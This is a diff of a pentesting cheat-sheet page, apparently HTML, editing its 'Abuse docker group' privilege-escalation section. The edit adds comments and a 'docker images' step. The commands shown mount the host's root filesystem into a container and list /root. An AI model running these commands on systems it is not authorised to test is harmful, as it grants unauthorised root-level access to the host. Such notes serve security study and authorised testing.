@@ -47,8 +47,12 @@
 <div class="content"><hr>
 <h3 id="privesc">Privesc</h3>
 <h4 id="abuse-docker-group">Abuse docker group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -v /:/mnt -it bash bash
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls /mnt/root
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List images</span>
+</span></span><span class="line"><span class="cl">docker images
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Mount host root filesystem</span>
+</span></span><span class="line"><span class="cl">docker run -v /:/mnt -it image_name bash
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">ls /mnt/root
 </span></span></code></pre></div><br></div></div>
     
     <script src="/js/utils.js"></script>
